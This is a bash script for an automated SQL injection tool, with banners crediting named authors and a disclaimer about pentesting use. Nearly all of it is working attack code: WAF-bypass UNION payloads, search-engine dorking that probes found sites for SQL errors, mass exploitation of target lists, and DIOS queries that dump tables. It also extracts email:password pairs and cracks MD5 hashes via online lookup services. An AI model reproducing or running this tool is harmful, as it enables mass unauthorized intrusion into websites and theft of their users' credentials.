#warning powerful tools xploiter can be harmful and detrimental
#GUNAKAN TOOLS INI UNTUK TUJUAN KEBAIKAN MEMBANTU PANTESTING
#BUKAN UNTUK MERUSAK SEGALA SEUSATU DI TANGGUNG PENGGUNA
#DI BUAT OPEN SOURCE
#SUPAYA KALIAN JUGA BISA BERKARYA
#Author: by MVNAM
#recode ?? silahkan asal sertakan nama author nya
#w buat cape cape, bukan untuk di salah gunakan, apalagi di recode
#Di buat: 10 - 07 - 2019
#release: 17 - 12 - 2019
N='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
O='\033[0;33m'

union="/**8**/and/**8**/0/**8**//*!50000UniOn*//**8**//*!50000select*//**8**/"
bof="+and+mod(9,9)+/*!50000UniON*/%23AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%0A/*!50000sEleCt*/+"
bof2="+and+mod(9,9)+/*!50000UniON*/%09++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++/*!50000sEleCt*/+"
urlencode="+div+0+/*!50000%55NIoN*/+/*!50000%53eLEct*/+"
custom_1="+and+mod(9,9)%20unION%2523aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0aSelect%20"
whitespaces="%0aand%0a0%0aUniON%0aselect%0A"
basic_1="/**//*!12345UNION+SELECT*//**/"

banner() {
  echo -e "
${G} ═════════════════════════════════════ 
                ANON1979VN NEW YORK SQL WEB
  ╔═══════╩══════════════════════════════╩═════════╗
    + Nhà phát triển - Telegram @Anon1979VN
    + Chào Mừng Đến Với Màn Hình Chính Của Anon1979
    + Nhập [trợ giúp] để xem Lệnh
    + Zalo 0825238152
    + SQLi tự động
    + Xploit sql-injection
    + SQLi Base64 tiêm
    + Trình tạo dork
    + Đảo ngược ip vuln sqli + tự động tiêm
    + Bản Quyền : Ma Văn Nam

   ╚════════════════════════════════════════════════╝
                            ${N} |==┣▇▇▇▇▇▇═─-SQl-i${G}

                 █${N} ${R}Agressiv${N}1njectorTeam${G} 
    ${O} Kedjaw${G}3${O}n ??${N}
::::::::::::::::::All-in one injector tools:::::::::::::::::::::::
        tools ini dibuat mengunakan query manual
   mudah di pahami untuk yg belum paham sql injection
                   - sqli never die -
================================================================="

}

gen() {
  echo -e "${G}[!} Dork generator by Kedjaw3n\n${O}cth: product cart buy${N}"
  echo -n "Masukan Keyword: "
  read key
  echo -e "${O}cth: .php .html .aspx${N}"
  read -p "Masukan Format : " mat
  echo -e "${O}berapa dork yg ingin di hasilkan max 800${N}"
  read -p "input number   : " drk
  for keyword in $key
    do
     for format in $mat
      do
       for parameter in $(sort -R .key | head -$drk)
        do
         echo -e "${G}inurl:$keyword$format$parameter${N}"
         echo "$keyword$format$parameter" >> dork.txt
        done
      done
   done
echo -e "${O}[INFO] Saved in dork.txt${N}"
}

hashid() { 
echo -e "[+]Hash Identifier"
read -p "Hash: " hash
ngcek=$(curl -sL "https://www.onlinehashcrack.com/hash-identification.php#results" -X POST --data "hash=${hash}&submit=submit" | grep -Po "\- [^<]*<br />" | cut -d "<" -f1 )
if [ "$ngcek" = "" ]
then
echo -e "Hash Unknow"
else
echo -e "[*]Hash Type:$ngcek" | head -1
echo -e "$ngcek" | sed 's/- /[INFO] Result: /g'
fi
}

hashmail() {
  
echo -n -e "[+] input list  : "
read list
echo -n -e "[+] Delimiter   : "
read del
echo -e "[+] Total       : $(cat $list | wc -l ) Empas\n[*] Cracking all Password....."
for hash in $(cat $list | cut -d "$del" -f2);
   do 
       dec=$(curl -s "http://www.nitrxgen.net/md5db/${hash}")
        echo "$dec" >> pw-$list
        if [ "$dec" = "" ];then
           echo "${hash}" >> 0-$list
           echo "[?] Not Cracked: ${hash} "
        else [ "$dec" = "[[:punct:][:alnum:]]*" ]
          echo "$dec" >> 1-$list
          echo "[!] Cracked: ${hash} $del $dec"
        fi
   done
cat $list | cut -d "$del" -f1 >> email-$list
paste -d "$del" email-$list pw-$list > cracked-$list
rm -rf email-$list pw-$list
echo -e "[*] Done.....\n[+] Result : cracked-$list"
echo -e "[+] Total  : $(cat 1-$list 2>/dev/null | wc -l) Empass Cracked"
echo -e "[+] Total  : $(cat 0-$list 2>/dev/null | wc -l) Empass Not Cracked"
echo -e "[*] Thx for using this tools :')";rm -rf 1-$list 0-$list

}

fuzy() {
sp="/-|"
sc=0
dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
mkdir -p output/$dir
echo -en "${O}[INFO] scaning $site......."
url1=$(curl -s -L "$site" | grep -P -a -o 'href="[^"]*' | tr -d "#" | sed 's/href="//g' | sed 's/--//g' | tr -d '<>' | tr -d '!' | grep -v "^$" | cut -d ":" -f1 | sed 's/https//g' | sed 's/http//g' | grep -v "^$");rm -rf .url
for d in $url1
do
ngurl=$(curl -s -L "$site/$d" | grep -P -a -o 'href="[^"]*' | tr -d "#" | sed 's/href="//g' | sed 's/--//g' | tr -d '<>' | tr -d '!' | grep -v "^$" | cut -d ":" -f1 | sed 's/https//g' | sed 's/http//g' | grep -v "^$")
printf "\b${sp:sc++:1}"
((sc==${#sp})) && sc=0
for link in $ngurl
 do
  printf "\b${sp:sc++:1}"
  ((sc==${#sp})) && sc=0
  url=$(echo "$site/$link" | sort | uniq -i >> .url)
  done
done;printf "\r%s\n" "$@"
if cat .url >/dev/null
 then 
if [ $? -eq 0 ];then
  cat .url | sort | uniq -i > output/$dir/crawled.txt
  echo -e "${N}[+] Total Url      : `cat .url | sort | uniq -i | wc -l` output/$dir/crawled.txt"
  if cat .url | grep -e ".jpg" -e ".png" -e ".ico" >/dev/null
  then
  echo "[+] images url     : `cat .url | grep -e ".jpg" -e ".png" -e ".ico" | sort | uniq -i | wc -l`"
  if cat .url | grep -e ".css" -e ".js" >/dev/null
  then
  echo "[+] js url         : `cat .url | grep -e ".css" -e ".js" | sort | uniq -i | wc -l`"
  if cat .url | grep -e ".php?id=" -e "?*=" | sort | uniq -i > output/$dir/vuln.txt
  then
    echo "[*] sqli vuln found: `cat .url | grep -e ".php?id=" -e "?*=" | sort | uniq -i | wc -l`"
    echo -e "[INFO] inject point yg di temukan\n`for inject in $(cat output/$dir/vuln.txt); do echo -e "${G}Result: $inject${N}";done`"
    echo "langsung inject...."
    for site in `cat output/$dir/vuln.txt`
    do
    sqli
  done
  else
    echo -e "${R}[!] inject point sqli tidak di temukan\ncoba cek output/$dir/crawled.txt untuk mencari inject point sendiri${N}"
   fi
else
  echo "[!] gagal mengambil url"
fi
fi
fi
else
       echo -e "${R}connection error: periksa kembali URL atau server down$N" >&2
fi
}

dora() {
    for COUNT in $(seq 1 $pa) 
       do
         if [[ "$page" = "b" ]]
         then
         b=$(curl -sL --max-time 120 "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '<h2><a href="[^"]*' | cut -d '"' -f2 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/instagram/d' | sed '/youtube/d' | sed '/&amp/d')
         #_COUNT=$((COUNT +12))
       else
         b=$( curl -s --max-time 240 "https://www.google.com/search?q=$dork=&start=${COUNT}" -L -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" | grep -Po '<a href="\K.*?(?=".*)' | egrep -o "(http(s)?://){1}[^'\"]+" | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/instagram/d' | sed '/youtube/d' | sed '/google/d' )
         #_COUNT=$((COUNT +12))
       fi
         for b in $b #jika result ingin dari google cukup ubah $b > $g
         do
         if echo -e "$b" | grep -Po '.php\?|=|.aspx|\?=' >/dev/null
            then
              ngecek=$(curl -sL --max-time 120 "$b%27")
              if [ $? -eq 0 ];then
              if echo "$ngecek"  | grep -Po "Warning: mysql_query|Warning: mysql_fetch_row|Warning: mysql_fetch_assoc|Warning: mysql_fetch_object|Warning: mysql_numrows|Warning: mysql_num_rows|Warning: mysql_fetch_array|Warning: pg_connect|Supplied argument is not a valid PostgreSQL result|PostgreSQL query failed: ERROR: parser: parse error|MySQL Error|MySQL ODBC|MySQL Driver|supplied argument is not a valid MySQL result resource|on MySQL result index|Oracle ODBC|Oracle Error|Oracle Driver|Oracle DB2|Microsoft JET Database Engine error|ADODB.Command|ADODB.Field error|Microsoft Access Driver|Microsoft VBScript runtime error|Microsoft VBScript compilation error|Microsoft OLE DB Provider for SQL Server error|OLE/DB provider returned message|OLE DB Provider for ODBC|ODBC SQL|ODBC DB2|ODBC Driver|ODBC Error|ODBC Microsoft Access|ODBC Oracle|JDBC SQL|JDBC Oracle|JDBC MySQL|JDBC error|JDBC Driver|Invision Power Board Database Error|DB2 ODBC|DB2 error|DB2 Driver|error in your SQL syntax|unexpected end of SQL command|invalid query|SQL command not properly ended|Error converting data type varchar to numeric|An illegal character has been found in the statement|Active Server Pages error|ASP.NET_SessionId|ASP.NET is configured to show verbose error messages|A syntax error has occurred|ORA-01756|Error Executing Database Query|Unclosed quotation mark|BOF or EOF|GetArray|FetchRow|Input string was not in a correct format|Warning: include|Warning: require_once|function.include|Disallowed Parent Path|function.require|Warning: main|Warning: session_start|Warning: getimagesize|Warning: mysql_result|Warning: pg_exec|Warning: array_merge|Warning: preg_match|Incorrect syntax near|ORA-00921: unexpected end of SQL command|Warning: ociexecute|Warning: ocifetchstatement|error ORA-" | head -1 > .error
              then 
                if cat .error | grep -Po "[[:alnum:]]" >/dev/null
                then
                  echo -e "$b" >> Result_dorking.txt
                  echo -e "${G}vuln sqli  : $b"
                  echo -e "Error found: `cat .error`${N}"
                else
                  echo -e "$b" >> Result_dorking.txt
                  echo -e "${O}mybe vuln  : $b"
                  echo -e "Error found: page blank${N}"
                fi
            fi
          fi
          else
      echo -e "${R}Urlparser  : $b ${N}" 
      echo -e "$b" >> url.txt
    break
fi
        done
done
}

sp="1234567890"
sc=0
spin() {
   printf "\b${sp:sc++:1}"
   ((sc==${#sp})) && sc=0
}
endspin() {
   printf "\r%s\n" "$@"
} 
dump() {
          c=$(cat .table | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
          coi=$(seq -s '-' $c | sed 's/[0-9]//g')
          echo -e "+$coi+\nTable Name::colomn name\n+$coi+$O"
          cat .table
          echo -en "${N}+$coi+\n"
          echo -en "Dump Table name  : "
          read table
          echo -ne "Dump Column name : "
          read co
          echo -e "+$coi+"
          cor=$(echo $co | sed 's/,/|/g')
          if cat .table | grep -Po "$table" >/dev/null
            then
              if cat .table | grep -Po "$cor" >/dev/null
               then
                 colom=$(echo $co | sed 's/,/,0x3a3a,/g')
                 _ump=",(/*!50000SELECT*/(@x)FROM(/*!50000SELECT*/(@x:=0x00),(/*!50000SELECT*/(@x)FROM($table)WHERE(@x)IN(@x:=/*!50000CONCAT*/(0x20,@x,0x3c6c693e,${colom}))))x),"
                 ump=",(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM($table)WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,${colom}))))x),"
                 if [[ "$based64" = "y" ]]
                  then
                    s=$(sed "s|$por|$ump|g" <<< $bs9)
                    bs77=$(echo "$s" | base64 -i)
                    base90=$(echo "$st$bs77" | tr -d "\n")
                    echo -e "QUERY : $base90" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                    echo -e "DUMP :: $base90" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                    cury=$(curl -s "$base90" | grep -a -Po "<li>[^<]*<li>|<li>[^<]*<" | sed 's/<li>//g' | sed 's/<//g' | sed '/^$/d' | tr -d '\0')
        else
                 s=$(sed "s|$por|$ump|g" <<< ${ds})
                 echo -e "QUERY : $s" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
                 echo -e "DUMP :: $s" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
                 cury=$(curl -s "$s" | grep -a -Po "<li>[^<]*<li>|<li>[^<]*<" | sed 's/<li>//g' | sed 's/<//g' | sed '/^$/d' | tr -d '\0')
               fi
                 if echo -e "$cury" >> output/$dir/dump-$table.txt
                   then
                     if cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' >/dev/null
                       then
                          echo -e "${O}Dump Email Found Auto filter$N"
                          echo -e "Total Dumped :$G `wc -l output/$dir/dump-$table.txt`"
                          for i in gmail yahoo aol hotmail
                            do 
                              cat output/$dir/dump-$table.txt | grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' | sort | uniq -i | grep $i >> $i.txt
                              echo -e "[+] `wc -l $i.txt`"
                          done
                          cat output/$dir/dump-$table.txt | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail >> others.txt
                          echo -e "[+] others : `wc -l others.txt`"
                          echo -n -e "dump lagi ?? y/n"
                          read ask
                          if [[ "$ask" = "y" ]]
                          then
                          dump
                        else
                          menu
                        fi
                      else
                          echo -e "Total Dumped :$G `wc -l output/$dir/dump-$table.txt`$N"
                          echo -e "$O$cury$N"
                          echo -n -e "dump lagi ?? y/n"
                          read ask
                          if [[ "$ask" = "y" ]]
                          then
                          dump
                        else
                          menu
                        fi
                        fi

                  else
                    echo -e "[INFO] F A I L E D try dump dios manual"
                  fi
              else
                 echo -e "${R}worng input$N"
                 dump
              fi
        else
          echo -e "${R}worng input$N"
          dump
        fi
}

email() {
  echo "$line";curl -s "$line" > tmp;grep -a -o '[[:alnum:]+\.\_\-]*@[[:alnum:]+\.\_\-]*::[[:alnum:]+\.\_\-\]*' "tmp" | sort | uniq -i > list;echo "";echo "Total Dumped : `wc -l list`";for i in gmail yahoo aol hotmail;do cat list | grep $i > $i.txt;echo "[+] `wc -l $i.txt`";done;cat list | grep -v gmail | grep -v yahoo | grep -v aol | grep -v hotmail > others.txt;echo "[+] others : `wc -l others.txt`";rm tmp
}

sqli() {
  inject
  if cat .tmp | grep '50' >/dev/null
    then 
      echo -e "$G[INFO]$O STRING BASED try to string based injection method$N"
      site="$site%27"
      if [[ "$based64" = "y" ]]
        then
       union="%27$union"
     fi
      echo -e "$site" >/dev/null
      inject
      if echo $i | grep '50' >/dev/null
        then 
          echo -e "$R[INFO] F A I L E D coba inject manual$N"
      fi  
  fi
}
info() {
   echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka
   if cat .angka >/dev/null
     then
       if echo $ngecur | grep -Po "where clause" >/dev/null
       then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
        cat .angka |  sed 's/kedjaw3n//g' > .angka
    fi
    if [[ "$based64" = "y" ]]
        then
       its=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')
     else
      its=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
     fi
       in=$(cat .angka | sort | head -1)
       dk=$( echo "$its" | sed "s/${in}/44444444/g") #bug hasil $dk , , seharus nya 4444444444
       _dk=$(echo $its | awk '{ gsub("$in",",44444444,",$1); print $1 }')
       ds=$(echo -e "$site$union$dk")
       us=",concat/**8**/(0x6b65646a6177336e2656657273696f6e3a,version/**8**/(),0x2655736572207365727665723a20,user/**8**/(),0x2644617461626173653a20,database/**8**/(),0x3c6b6564),"
       por=",44444444,"
       if [[ "$based64" = "y" ]]
        then
          st=$(echo "`cut -d "=" -f1 <<< $site`=" )
          bs9=$(echo "null$union$dk")
          base44=$(sed "s#$por#$us#g" <<< $bs9)
          bs57=$(echo "$base44" | base64 -i)
          base94=$(echo "$st$bs57" | tr -d "\n")
          info=$(curl -s -L "$base94" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d')
       else
       db=$(sed "s#$por#$us#g" <<< $ds)
       info=$(curl -s -L "$db" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d')
     fi
       else
        echo -e "[INFO] gagal ambil info server"
    fi
}

dios() {
  if cat .angka >/dev/null
   then
    if echo $ngecur | grep -Po "Unknown column 'kedjaw3n[0-9]*'" >/dev/null
       then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g')
        ids=$(echo "$site$union$colom--+" | sed "s/0x6b65646a6177336e3${df}/${df}/g")
        curl -s -L "$ids" | grep -Po 'kedjaw3n[0-9]*' > .angka
        cat .angka |  sed 's/kedjaw3n//g' > .angka
    fi
    if [[ "$based64" = "y" ]]
        then
       i=$(echo -e "$colom-- -" | sed 's/0x6b65646a6177336e3//g')
     else
      i=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
     fi
    in=$(cat .angka | sort | head -1)
    dk=$( echo "$i" | sed "s/${in}/44444444/g") #bug jika angka togel di akhir pasti hasil nya blank
    _dk=$(echo $i | awk '{ gsub("$in",",44444444,",$1); print $1 }')
    ds=$(echo -e "$site$union$dk")
    dor=",(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x),"
    por=",44444444,"
    if [[ "$based64" = "y" ]]
        then
          st=$(echo "`cut -d "=" -f1 <<< $site`=" )
          bs9=$(echo "null$union$dk")
          base44=$(sed "s#$por#$dor#g" <<< $bs9)
          bs57=$(echo "$base44" | base64 -i)
          base99=$(echo "$st$bs57" | tr -d "\n")
          echo -e "DIOS : $base99"
        #echo -e "\n$bs57\n$base44\n$bs9\n$st" #test
         if curl -s -L "$base99" | grep -a -o '<li>[^:]*::[[:alnum:]]*' | cut -d '>' -f2 > .table
           then 
            dump
         else
            echo -e "$R[INFO] F A I L E D try dump dios manual$N"
         fi
       else
    ls=$(sed "s#$por#$dor#g" <<< $ds)
    #echo -e "DIOS : $in $i $_dk $por \n$ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' #test
    echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
    echo -e "DIOS : $ls" | sed 's/44444444//g' | sed 's/0x6b65646a6177336e3//g'
    if curl -s -L "$ls" | grep -a -o '<li>[^:]*::[[:alnum:]]*' | cut -d '>' -f2 > .table
        then 
          dump
        else
          echo -e "$R[INFO] F A I L E D try dump dios manual$N"
    fi
  fi
fi
}

inject() {
dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
echo -e "${G}[INFO]$N ${dir}$N conection checking"
echo -n -e "memulai menghitung order by ~"
for i in $(seq 50)
  do
    spin
    colom=$(seq -s ",0x6b65646a6177336e3" ${i})
    if [[ "$based64" = "y" ]]
    then
      st=$(echo "`cut -d "=" -f1 <<< $site`=" )
      bs4=$(echo "null$union$colom-- -" | base64 -i)
      base64=$(echo "$st$bs4" | tr -d "\n")
      ngecur=$(curl -sL "$base64")
      #echo -e "$i\n$base64"
    else
    ngecur=$(curl -s  --max-time 120 "$site$union$colom--+" -L -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0")
  fi
   #echo -e "$site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' #test
   if [ $? -eq 0 ]
    then
    if echo -e "$ngecur" | grep -Po 'Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' >/dev/null
      then 
       echo -e "\n${R}[INFO] waff blocked try hard waff injection for bypass$N"
       echo -e "$site" >> waf.txt
      break
    fi
    if echo "$ngecur" | grep -Po "kedjaw3n3|kedjaw3n[0-9]*" > .angka
      then
       angka=$(cat .angka | cut -d "." -f2 | tr "\n" "," ) 
       if [ "$i" = "1" ]
         then 
           echo -e "\n${R}[INFO]${R} Failed try manual injection$N"
           echo -e "$site" >> manual.txt
         break
       fi
       mkdir -p output/$dir
       echo -e -n "\norder by yg di dapat ${i} colom"
       echo -e -n "\n$G[INFO] Site $dir injected $O\n"
       info
       echo -e "$info"
       if [[ "$based64" = "y" ]]
         then
          echo -e "Query: $base64" >> output/$dir/log_query.txt
          echo -e "Query: $base64"
          echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
       else
       #echo -e "Query: $site$union$colom--+" #test
       echo -e "\nQuery $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> output/$dir/log_query.txt
       echo -e "Query: $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g' >> injected.txt
       echo -e "Query: $site$union$colom--+" | sed 's/0x6b65646a6177336e3//g'
       echo -e "${O}angka yg di tampilkan:$G $angka$N\n" | sed 's/kedjaw3n//g'
       echo -e "$angka" |  sed 's/kedjaw3n//g' | grep -a -o '[0-9]' > .angka
     fi
       if echo $mass | grep -Po "y" >/dev/null
       then
        break
      else
       echo -n "lanjut dios ?? y/n: "
       read ask
       if [[ "$ask" = "y" ]] 
        then
          dios
       else
          break
       fi
     fi
       break
      else
       echo $i > .tmp
     fi
     else
       echo -e "\n${R}connection error: periksa kembali URL atau server down$N" >&2
       break
  fi
done;endspin
}
menu() {
banner
echo -e "$G[+] Auto SQLi Menu$N"
echo -e "[1]. singgle site injection"
echo -e "[2]. Mass Xploit sql-injection"
echo -e "[3]. aUTO DorKiNg + AutO Xploit"
echo -e "[4]. SQLi Base64 injection"
echo -e "[5]. SQLi Hard /*!WaF*/ Bruteforce All bypasing method"
echo -e "[6]. Scan site + auto inject ( inject point findder )"
echo -e "[7]. Reverse ip vuln sqli + auto inject"
echo -e "[8]. Query Email Pass dumper + auto filter mail"
echo -e "[9]. Hash tools"
echo -e "[10]. Dork generator"
echo -n "[?] yg mana ?? "
read d
case $d in
 1) mass="n"
    clear
    banner
    echo -e "$G[!] singgle site injection$N"
    echo -n '[?] site:'
    read site
    sqli
    menu
    ;;
 2) mass="y"
    clear
    banner
    echo -e "$G[!] mass sqli from list$N"
    echo -n "[?] Masukan list taget: "
    read tar
    echo -n -e "[+] Total Load site   : ";wc -l $tar
    for site in $(cat $tar)
       do
        sqli
    done
    menu
    ;;
  3) mass="y"
     clear
     banner
     echo -e "$G[!] aUTO DorKiNg + AutO Xploit$N"
     echo -e "[1]. dorking biasa"
      echo -e "[2]. dorking masal"
      echo -e "[3]. kembali ke menu utama"
      echo -n "[?] yg mana ?? "
      read d
      case $d in
       1) mass="y"
          clear
          banner
          echo -e "${G}[+] Auto dorking + auto scan + auto xploit\n${O}Nb: MUNGKIN MASIHH ADA SEDIKIT BUG YG TIDAK SESUAI DENGAN REAL VULN${N} "
          echo -n "[+] dorking bing/google: b/g ?? "
          read page
          echo -n "[+] dork sqli: "
          read dork
          read -p "[+] page: " pa
          rm -rf Result_dorking.txt
          dora #Result_dorking.txt
          for site in $(cat Result_dorking.txt 2>/dev/null | sort | uniq -i) 
            do
            sqli
            done
            menu
        ;;
        2) mass="y"
          clear
          banner
          echo -e "${G}[+] Auto dorking masal + auto scan + auto xploit\n${O}Nb: MUNGKIN MASIHH ADA SEDIKIT BUG YG TIDAK SESUAI DENGAN REAL VULN${N} "
          echo -n "[+] dorking bing/google: b/g ?? "
          read page
          echo -n "[+] dork sqli list: " | sed 's/inurl:/+/g'
          read dor
          read -p "[+] page: " pa
          rm -rf Result_dorking.txt
          for dork in $(cat $dor)
           do
            dora #Result_dorking.txt
          done
          for site in $(cat Result_dorking.txt 2>/dev/null | sort | uniq -i)
            do
            sqli
          done
            menu
       ;;
         *) echo -e "[+] Thx for using this tools";;
         esac
  ;; 
  4) based64="y"
     mass="n"
     clear
     banner
     echo -e "$G[!] base64 injection\n${O}KHUSUS UNTUK INJECT POINT BASE64$N"
     read -p "site: " site
     sqli
     menu
  ;;      
  5) mass="n"
     clear
     banner
     echo -e "$G[!] BrUteforce waf bypassing$N"
     echo -n "[+] Hard waf site: "
     read site
     cat union.txt | while read uni
     do
      echo "mencoba bypass dengan $uni"
      cek=$(curl --max-time 60 -sL "$site%27${uni}1,2,3--+")
       if [ $? -eq 0 ]
         then
      if echo -e "$cek" | grep -Po 'Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' > .waf
      then
        echo -e "${R}WAF BLOCKED: $uni\nWAF TYPE: `cat .waf | head -1`$N"
      else
       echo -e "WAF Bypased using: $uni"
       union="/**8**/and/**8**/0/**8**/$uni/**8**/"
       echo ".rdy" > .rdy
     break
    fi
     else
       echo -e "${R}WAF BLOCKED: $uni\nWAF TYPE: Connection Reset$N" >&2
     fi
  done
  if cat .rdy >/dev/null
  then
  sqli
  menu
else
  menu
fi
   ;;
   6) clear
     banner
     echo -e "$G[!] scan site + auto xploit$N"
     echo -e "[1]. scan biasa"
     echo -e "[2]. scan masal"
     echo -e "[3]. kembali ke menu utama"
     echo -n "[?] yg mana ?? "
     read d
     case $d in
      1) mass="n"
        clear
        banner
        echo -e "$G[!] scan site + auto inject$N"
        read -p 'site: ' site
        fuzy
      ;;
      2) clear
        banner
        echo -e "$G[!] scan site + auto inject masal$N"
        read -p 'site list: ' file
        for site in `cat $file`
        do
        fuzy
      done
      ;;
      3) menu
      ;;
         *) echo -e "[+] Thx for using this tools";;
         esac
   ;;
   7) rm -rf Result_dorking.txt
      clear
      banner
      echo -e "$G[!] Reverse ip vuln sqli + auto inject$N"
      read -p "site: " site
      get=$(echo $site | sed 's!http[s]*://!!g' | sed 's,/,,g')
      asw=$(command -v getent)
      if [[ "$asw" = "" ]] 
       then
         ip=$(dig +short $get | tail -1)
       else
        ip=$(getent hosts $get | awk '{ print $1 }' | head -1)
      fi
      echo $ip
      page="b"
      dork=".php%3Fid%3D+ip%3a$ip"
      dora
      for site in $(cat Result_dorking.txt 2>/dev/null | sort | uniq -i)
            do
            sqli
          done
            menu
   ;;
   8) clear
      banner
      echo -e "$G[!] Query Email Pass dumper + auto filter mail ${N}"
      echo -e "[1]. dump biasa"
      echo -e "[2]. dump masal"
      echo -e "[3]. kembali ke menu utama"
      echo -n "[?] yg mana ?? "
      read p
      case $p in
        1) clear
           banner
           echo -e "$G[!] Query Email Pass dumper + auto filter mail ${N}"
           read -p "masukan query sqli yg sudah di dump email passs: " line
           email
           menu
           ;;
        2) clear
           banner
           echo -e "$G[!] Query Email Pass dumper + auto filter mail ${N}"
           read -p "masukan list file query sqli yg sudah di dump email passs: " file
           cat $file | while read line
           do
             email
           done
           menu
        ;;
        3) clear;menu
        ;;
        *) clear;menu
        ;;
           esac  
   ;;
   9) clear
      banner
      echo -e "$G[!] Hash tools ${N}"
      echo -e "[1]. hash Identifier"
      echo -e "[2]. md5 decrytor"
      echo -e "[3]. md5 emil pass decrytor"
      echo -n "[?] yg mana ?? "
      read p
      case $p in
        1) clear
           banner
           hashid
           menu
        ;;
        2) clear
           banner
           echo -e "$G[!] md5 decryptor ${N}"
           echo -e "[1]. biasa"
           echo -e "[2]. masal"
           echo -n "[?] yg mana ?? "
             read p
             case $p in
              1) clear
                 banner
                 read -p "[+] Hash: " hash
                 dec=$(curl -s "http://www.nitrxgen.net/md5db/${hash}")
                 echo "Result: $dec"
                 menu 
              ;;
              2) clear
                 banner
                 read -p "[+] Masukan list md5: " file
                 for hash in `cat $file`
                 do
                 dec=$(curl -s "http://www.nitrxgen.net/md5db/${hash}")
                 if [ "$dec" = "" ];then
                    echo "[?] Not Cracked: ${hash} "
                  else [ "$dec" = "[[:punct:][:alnum:]]*" ]
                     echo "$dec" >> cracked-$list.txt
                     echo "[!] Cracked: ${hash} $del $dec"
               fi
               done
               menu
               ;;
               *) clear;menu;;
             esac
             ;;
        3) clear
           banner
           echo -e "$G[!] md5 emil pass decrytor ${N}"
           hashmail
           menu
          ;;
        *) clear;menu;;
      esac

   ;;
   10) clear
      banner
      gen
      menu
   ;;
   *) echo -e "[+] Thx for using this tools";;
esac
}
menu